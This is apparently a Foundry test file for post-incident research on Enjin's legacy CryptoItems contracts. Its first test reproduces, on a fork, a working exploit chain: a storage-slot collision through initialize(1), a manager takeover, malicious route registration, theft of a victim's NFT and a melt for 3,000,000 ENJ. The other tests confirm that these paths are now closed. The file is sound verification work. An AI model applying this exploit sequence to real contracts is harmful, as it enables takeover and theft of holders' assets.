// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {MaliciousShellLogic} from "../src/MaliciousShellLogic.sol";

/// @title  Enjin legacy CryptoItems — C2-23 fork verification
/// @notice Read-only research. All tests run on forks; nothing is sent to mainnet.
///         Test 01 reproduces the Aug-25-2026 takeover+theft with a *fresh* attacker at the
///         pre-incident block (proves the mechanism and the harness).
///         Tests 02-06 prove that at the *latest* block every formerly-open path is closed:
///         the manager takeover is locked, the attacker's residual adapter is caller-gated,
///         and the Adapter/reserve reject unprivileged writes.
contract EnjinLegacyTest is Test {
    // ---- mainnet addresses (all verified live via eth_getCode) -------------------------------
    address constant PA          = 0xfaaFDc07907ff5120a76b34b731b278c38d6043C; // ERC-1155 facade / platform adapter
    address constant ADAPTER     = 0x4E643a25a64952895f553f20252861258727174e; // eternal storage + ENJ reserve
    address constant NF_TEMPLATE = 0x13fA4b9a6C2F2604C919f96F456e3b50E968b157; // Managed proxy (NFT)
    address constant FT_TEMPLATE = 0x268C039A3127D3107c014F0DC6c390A53e6dB27f; // Managed proxy (FT)
    address constant ENJ         = 0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c;
    address constant ATTACK_CONTRACT = 0x7083DdecE38216C7741fa76c75326Bea744ED321; // still the manager of both templates
    address constant ATTACK_EOA  = 0x5ec1BA7892D11059c39557b762a97DD695778Ca5;
    address constant MALICIOUS_ADAPTER = 0x99294e5e8dd62Fa0092A85AB37e8B5c44Ec29758;
    address constant INSTALLER_STUB    = 0x73497e1C3070A031e1EE05fdEAaeb73C9DD8fcB5; // "initialize" route: reverts "locked" on templates only
    address constant SHELL_NFT   = 0x005ae6aF58f5a14d6D993E91052E17C23AF14a20; // incident shell, baseType 0x788...0a2f
    address constant SHELL_FT    = 0x68e2098057c9341E1e7Fb466bc05810dDC20Bb35; // incident shell, baseType 0x7000...0002
    address constant BURN_MARKER = 0x0000DeAddeAdDeaDdEADdEadDEaddEaDDEad0000;

    // Historical incident constants (block 25834070 pre-attack, tx at 25834071)
    uint256 constant INCIDENT_BLOCK = 25_834_070;
    uint256 constant BASE_TYPE_ID   = 0x7880000000000a2f000000000000000000000000000000000000000000000000;
    uint256 constant TARGET_ID      = 0x7880000000000a2f000000000000000000000000000000000000000000000001;
    address constant VICTIM         = 0x50bF217523dC390B18f31bdb1099eBF937dA1756;
    uint256 constant MELT_VALUE     = 3_000_000e18;
    address constant DISPLACED_PENDING = 0xE5cb0C8E160C5aC4669D1dfD689Df01bA9eea3eB;

    bytes4 constant SEL_INITIALIZE     = 0xfe4b84df; // initialize(uint256)
    bytes4 constant SEL_ACCEPT_MANAGER = 0x48ff15b3; // acceptManager()
    bytes4 constant SEL_UPDATE         = 0x61455567; // updateContract(address,string,string)
    bytes4 constant SEL_DEPLOY_SHELL   = 0x33d332ab; // deploy-shell(baseType,string,uint8)
    bytes4 constant SEL_MELT           = 0xf6089e12; // melt(uint256[],uint256[])
    bytes4 constant SEL_GATEWAY_NFT    = 0x41c1df0e; // gateway(operator,from,to,id)
    bytes4 constant SEL_STEAL_NFT      = 0x6453dcf6; // "stealNFT(address,address,uint256)" (attacker-registered)
    bytes4 constant SEL_TRANSFER_FT    = 0x23b872dd; // "transferFrom(address,address,uint256)" (attacker-registered on FT template)
    bytes4 constant SEL_SET_OWNER      = 0x95760fb9; // Adapter ledger write

    // ---------------------------------------------------------------------------------------
    function _archiveFork() internal view returns (string memory) {
        return vm.envOr("BLOCKPI_RPC_URL",
               vm.envOr("NODEREAL_ETH_RPC_URL",
               vm.envOr("FORK_RPC_URL",
               vm.envOr("RPC_URL", string("https://eth.drpc.org")))));
    }
    function _latestFork() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL",
               vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }
    function _reason(bytes memory ret) internal pure returns (string memory) {
        if (ret.length < 68) return "";
        bytes4 sel;
        assembly { sel := mload(add(ret, 0x20)) }
        if (sel != 0x08c379a0) return "";
        uint256 len;
        assembly { len := mload(add(ret, 0x44)) }
        bytes memory s = new bytes(len);
        for (uint256 i = 0; i < len; i++) s[i] = ret[68 + i];
        return string(s);
    }
    function _enj(address who) internal view returns (uint256) {
        (bool ok, bytes memory d) = ENJ.staticcall(abi.encodeWithSelector(0x70a08231, who));
        require(ok, "balanceOf failed");
        return abi.decode(d, (uint256));
    }

    // =======================================================================================
    // 01 — HISTORICAL REPRO with a fresh, zero-privilege attacker (block 25,834,070)
    //      initialize(1) slot collision -> acceptManager -> route poison -> shell gateway theft -> melt 3M ENJ
    // =======================================================================================
    function test_01_historical_repro_fresh_attacker() public {
        vm.createSelectFork(_archiveFork(), INCIDENT_BLOCK);
        address attacker = makeAddr("freshAttacker");

        // Pre-state: the templates are mid-handover; the displaced pending manager is the team's target.
        assertEq(address(uint160(uint256(vm.load(NF_TEMPLATE, bytes32(uint256(1)))))), DISPLACED_PENDING, "pendingManager pre != displaced");

        // The per-item shell is lazily created and the route is permissionless (pre-mitigation).
        vm.prank(attacker);
        (bool ok, bytes memory ret) = PA.call(abi.encodeWithSelector(SEL_DEPLOY_SHELL, BASE_TYPE_ID, "", uint8(0)));
        assertTrue(ok, string.concat("deploy shell failed: ", _reason(ret)));
        address shell = abi.decode(ret, (address));
        assertEq(shell, SHELL_NFT, "unexpected shell address");
        assertEq(_ownerOfViaShell(shell, TARGET_ID), VICTIM, "victim does not own target at incident block");

        // Step 1-2: slot collision through a registered adapter's public initialize(uint256) + native acceptManager()
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_INITIALIZE, uint256(1)));
        assertTrue(ok, string.concat("initialize failed: ", _reason(ret)));
        assertEq(address(uint160(uint256(vm.load(NF_TEMPLATE, bytes32(uint256(1)))))), attacker, "pendingManager not overwritten");
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_ACCEPT_MANAGER));
        assertTrue(ok, string.concat("acceptManager failed: ", _reason(ret)));
        assertEq(_manager(NF_TEMPLATE), attacker, "takeover failed");

        // Step 3: route poisoning — register a fresh malicious implementation for a private selector.
        MaliciousShellLogic logic = new MaliciousShellLogic();
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_UPDATE, address(logic), "drain(address,address,address,uint256);", "poison"));
        assertTrue(ok, string.concat("updateContract failed: ", _reason(ret)));

        // Step 4: drain the victim's instance through the shell -> attacker-adapter -> PA gateway.
        vm.prank(attacker);
        (ok, ret) = shell.call(abi.encodeWithSelector(MaliciousShellLogic.drain.selector, attacker, VICTIM, attacker, TARGET_ID));
        assertTrue(ok, string.concat("drain failed: ", _reason(ret)));
        assertEq(_ownerOfViaShell(shell, TARGET_ID), attacker, "ownership not hijacked");

        // Step 5: melt the stolen item -> 3,000,000 ENJ from the Adapter reserve.
        uint256 before = _enj(attacker);
        uint256[] memory ids = new uint256[](1); ids[0] = TARGET_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1;
        vm.prank(attacker);
        (ok, ret) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, amts));
        assertTrue(ok, string.concat("melt failed: ", _reason(ret)));
        assertEq(_enj(attacker) - before, MELT_VALUE, "attacker did not receive 3,000,000 ENJ");
        assertEq(_ownerOfViaShell(shell, TARGET_ID), BURN_MARKER, "item not burned");
    }

    // =======================================================================================
    // 02 — LATEST: the takeover is permanently closed (attacker's lock stubs + native guards)
    // =======================================================================================
    function test_02_takeover_closed_at_latest() public {
        vm.createSelectFork(_latestFork());
        address attacker = makeAddr("freshAttacker");

        // manager/pending state: manager is still the attacker's contract; pendingManager is zero.
        assertEq(_manager(NF_TEMPLATE), ATTACK_CONTRACT, "NF manager changed");
        assertEq(_manager(FT_TEMPLATE), ATTACK_CONTRACT, "FT manager changed");
        assertEq(uint256(vm.load(NF_TEMPLATE, bytes32(uint256(1)))), 0, "pendingManager != 0");

        // initialize(1) via the template now routes to the lock stub -> revert "locked"
        (bool ok, bytes memory ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_INITIALIZE, uint256(1)));
        assertFalse(ok, "initialize(1) unexpectedly succeeded");
        assertEq(_reason(ret), "locked", "unexpected initialize revert reason");
        (ok, ret) = FT_TEMPLATE.call(abi.encodeWithSelector(SEL_INITIALIZE, uint256(1)));
        assertFalse(ok, "FT initialize(1) unexpectedly succeeded");
        assertEq(_reason(ret), "locked", "unexpected FT initialize revert reason");

        // acceptManager() is native and refuses while pendingManager == 0
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_ACCEPT_MANAGER));
        assertFalse(ok, "acceptManager unexpectedly succeeded");
        assertEq(_reason(ret), "Managed: Sender must be the new manager", "unexpected acceptManager revert");

        // transferManager() is manager-only (manager = attacker contract)
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(0xba0e930a, attacker));
        assertFalse(ok, "transferManager unexpectedly succeeded");
        assertEq(_reason(ret), "Managed: only manager", "unexpected transferManager revert");

        // updateContract() is manager-only
        vm.prank(attacker);
        (ok, ret) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_UPDATE, address(0xBEEF), "drain();", "poison"));
        assertFalse(ok, "updateContract unexpectedly succeeded");
        assertEq(_reason(ret), "Sender is not manager.", "unexpected updateContract revert");

        // the installer stub is still reachable through shells but only writes shell storage,
        // never the templates (its own guard: this==template -> revert "locked" - proven above).
        assertEq(NF_TEMPLATE.code.length > 0, true);
        assertEq(FT_TEMPLATE.code.length > 0, true);
    }

    // =======================================================================================
    // 03 — LATEST: the attacker's still-registered malicious adapter is caller-gated ("only pwn")
    // =======================================================================================
    function test_03_malicious_adapter_reuse_closed_at_latest() public {
        vm.createSelectFork(_latestFork());
        address attacker = makeAddr("freshAttacker");

        // The malicious adapter is still the registered delegate for these selectors...
        assertEq(_delegate(NF_TEMPLATE, SEL_STEAL_NFT), MALICIOUS_ADAPTER, "NFT steal route changed");
        assertEq(_delegate(FT_TEMPLATE, SEL_TRANSFER_FT), MALICIOUS_ADAPTER, "FT steal route changed");

        // ...but every call from a non-attacker address reverts with the attacker's guard.
        (bool ok, bytes memory ret) = SHELL_NFT.call(abi.encodeWithSelector(SEL_STEAL_NFT, attacker, attacker, TARGET_ID));
        assertFalse(ok, "NFT steal route unexpectedly succeeded");
        assertEq(_reason(ret), "only pwn", "unexpected NFT steal revert");

        (ok, ret) = SHELL_FT.call(abi.encodeWithSelector(SEL_TRANSFER_FT, attacker, attacker, uint256(1)));
        assertFalse(ok, "FT steal route unexpectedly succeeded");
        assertEq(_reason(ret), "only pwn", "unexpected FT steal revert");

        // The original attacker contract's write entry points are owner-gated too.
        assertEq(_ownerOf(ATTACK_CONTRACT), ATTACK_EOA, "attack contract owner changed");
        vm.prank(attacker);
        (ok, ret) = ATTACK_CONTRACT.call(abi.encodeWithSelector(0x35faa416)); // sweep()
        assertFalse(ok, "attacker contract sweep unexpectedly callable");
    }

    // =======================================================================================
    // 04 — LATEST: direct writes are rejected (gateway, ledger, reserve, deploy-shell misuse)
    // =======================================================================================
    function test_04_direct_paths_closed_at_latest() public {
        vm.createSelectFork(_latestFork());
        address attacker = makeAddr("freshAttacker");

        // the Adapter itself is globally locked (Enjin emergency response, block 25,835,670)
        assertTrue(_isLocked(), "adapter not globally locked");

        // gateway direct call -> "Function does not exist." (PA routes were disabled by Enjin at block 25,853,511)
        (bool ok, bytes memory ret) = PA.call(abi.encodeWithSelector(SEL_GATEWAY_NFT, attacker, VICTIM, attacker, TARGET_ID));
        assertFalse(ok, "direct gateway unexpectedly succeeded");
        assertEq(_reason(ret), "Function does not exist.", "unexpected gateway revert");

        // FT gateway route disabled too
        (ok, ret) = PA.call(abi.encodeWithSelector(0xf95d7da3, attacker, VICTIM, attacker, TARGET_ID));
        assertFalse(ok, "FT gateway route unexpectedly succeeded");
        assertEq(_reason(ret), "Function does not exist.", "unexpected FT gateway revert");

        // shell-deployment route disabled too (no new shells; no fresh gateway identity)
        (ok, ret) = PA.call(abi.encodeWithSelector(SEL_DEPLOY_SHELL, BASE_TYPE_ID, "", uint8(0)));
        assertFalse(ok, "deploy-shell route unexpectedly succeeded");
        assertEq(_reason(ret), "Function does not exist.", "unexpected deploy-shell revert");

        // ledger ownership write -> rejected (only PA approved)
        vm.prank(attacker);
        (ok, ret) = ADAPTER.call(abi.encodeWithSelector(SEL_SET_OWNER, TARGET_ID, VICTIM, attacker));
        assertFalse(ok, "ledger write unexpectedly succeeded");

        // reserve release -> rejected (only PA approved)
        vm.prank(attacker);
        (ok, ret) = ADAPTER.call(abi.encodeWithSelector(0x7843e5dd, attacker, uint256(1)));
        assertFalse(ok, "reserve release unexpectedly succeeded");

        // melt by a non-owner -> rejected
        uint256[] memory ids = new uint256[](1); ids[0] = TARGET_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1;
        vm.prank(attacker);
        (ok, ret) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, amts));
        assertFalse(ok, "melt by non-owner unexpectedly succeeded");
    }

    // =======================================================================================
    // 05 — LATEST: residual state snapshot (who controls what; what is left)
    // =======================================================================================
    function test_05_residual_state_snapshot() public {
        vm.createSelectFork(_latestFork());
        uint256 reserve = _enj(ADAPTER);
        console2.log("latest block            :", block.number);
        console2.log("reserve (ADAPTER) ENJ   :", reserve);
        console2.log("NF manager              :", _manager(NF_TEMPLATE));
        console2.log("FT manager              :", _manager(FT_TEMPLATE));
        console2.log("attack contract owner   :", _ownerOf(ATTACK_CONTRACT));
        console2.log("attacker EOA ETH wei    :", ATTACK_EOA.balance);
        console2.log("ENJ balance att.EOA     :", _enj(ATTACK_EOA));
        console2.log("ENJ balance att.contract:", _enj(ATTACK_CONTRACT));

        assertGt(reserve, 3_000_000e18, "reserve below expected residual");
        assertEq(_manager(NF_TEMPLATE), ATTACK_CONTRACT, "manager not attacker contract");
        assertEq(_manager(FT_TEMPLATE), ATTACK_CONTRACT, "FT manager not attacker contract");
    }

    // =======================================================================================
    // 06 — LATEST: the installer still runs through shells but grants nothing
    // =======================================================================================
    function test_06_shell_installer_is_inert_at_latest() public {
        vm.createSelectFork(_latestFork());
        address attacker = makeAddr("freshAttacker");

        // calling initialize via the shell goes to the attacker's installer, which only writes
        // shell-local storage (slot1=caller, slot2=arg) and does NOT revert when this==shell.
        vm.prank(attacker);
        (bool ok, ) = SHELL_NFT.call(abi.encodeWithSelector(SEL_INITIALIZE, uint256(1)));
        assertTrue(ok, "shell initialize route reverted");

        // ...but the Adapter's ownership ledger is untouched and a melt by the attacker still fails.
        uint256[] memory ids = new uint256[](1); ids[0] = TARGET_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1;
        vm.prank(attacker);
        (bool ok2, ) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, amts));
        assertFalse(ok2, "melt unexpectedly succeeded");
    }

    // =======================================================================================
    // 07a — pre-incident (block 25,834,070): the same holder could melt the same item — redeemable then
    // =======================================================================================
    // A live item verified by the census (block 26,152,685): NFT instance held by an EOA.
    address constant LIVE_HOLDER = 0xbBC52f6551053F1bCe454b4B622cc67069f70a69;
    uint256 constant LIVE_ID     = 0x6080000000000849000000000000000000000000000000000000000000000002;
    bytes4  constant SEL_IS_LOCKED = 0x5d63a6df; // isGlobalLocked()

    function test_07a_holder_melt_was_live_pre_incident() public {
        vm.createSelectFork(_archiveFork(), INCIDENT_BLOCK);
        assertFalse(_isLocked(), "adapter already locked pre-incident");
        uint256[] memory ids = new uint256[](1); ids[0] = LIVE_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1;
        vm.prank(LIVE_HOLDER);
        (bool ok, bytes memory ret) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, amts));
        assertTrue(ok, string.concat("pre-incident holder melt failed: ", _reason(ret)));
    }

    // =======================================================================================
    // 07b — latest: melt is frozen by the Adapter's global lock (Enjin emergency response)
    //      tx 0xe7f2d0a3b90250adcbba7f0a82900d20510ba5584a47aa8aafe9869a25e81c27 @ block 25,835,670
    // =======================================================================================
    function test_07b_holder_melt_frozen_at_latest() public {
        vm.createSelectFork(_latestFork());
        assertTrue(_isLocked(), "adapter not locked at latest");
        uint256[] memory ids = new uint256[](1); ids[0] = LIVE_ID;
        uint256[] memory amts = new uint256[](1); amts[0] = 1;
        vm.prank(LIVE_HOLDER);
        (bool ok, ) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, amts));
        assertFalse(ok, "holder melt unexpectedly succeeded while locked");
    }

    function _isLocked() internal view returns (bool) {
        (bool ok, bytes memory d) = ADAPTER.staticcall(abi.encodeWithSelector(SEL_IS_LOCKED));
        require(ok, "isGlobalLocked failed");
        return abi.decode(d, (bool));
    }

    // ---- helpers ---------------------------------------------------------------------------
    function _manager(address t) internal view returns (address) {
        (bool ok, bytes memory d) = t.staticcall(abi.encodeWithSelector(0xd5009584));
        require(ok, "getManager failed");
        return abi.decode(d, (address));
    }
    function _delegate(address t, bytes4 sel) internal view returns (address) {
        (bool ok, bytes memory d) = t.staticcall(abi.encodeWithSelector(0xa0a2daf0, sel));
        require(ok, "delegates failed");
        return abi.decode(d, (address));
    }
    function _ownerOf(address a) internal view returns (address) {
        (bool ok, bytes memory d) = a.staticcall(abi.encodeWithSelector(0x8da5cb5b));
        if (!ok) return address(0);
        return abi.decode(d, (address));
    }
    function _ownerOfViaShell(address shell, uint256 id) internal view returns (address) {
        (bool ok, bytes memory d) = shell.staticcall(abi.encodeWithSelector(0x6352211e, id));
        require(ok, "ownerOf failed");
        return abi.decode(d, (address));
    }
}
